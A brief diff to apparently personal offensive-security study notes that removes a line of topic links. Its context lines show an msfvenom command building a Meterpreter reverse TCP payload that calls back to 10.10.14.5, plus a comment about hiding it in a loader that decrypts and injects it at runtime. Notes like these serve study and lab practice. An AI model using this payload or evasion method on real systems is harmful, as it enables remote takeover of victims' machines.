@@ -251,9 +251,6 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=443 \
 
 # 2) Embed in your own loader (C#/C++) that decrypts + injects at runtime
 ```
-
-Related notes: [[AV Evasion]] · [[Meterpreter]] · [[Metasploit Framework]] · [[Shellcode Injection]] · [[DLL Hijacking]] · [[APK Re-signing]]
-
 ---
 
 ## 6. Quick Reference Card
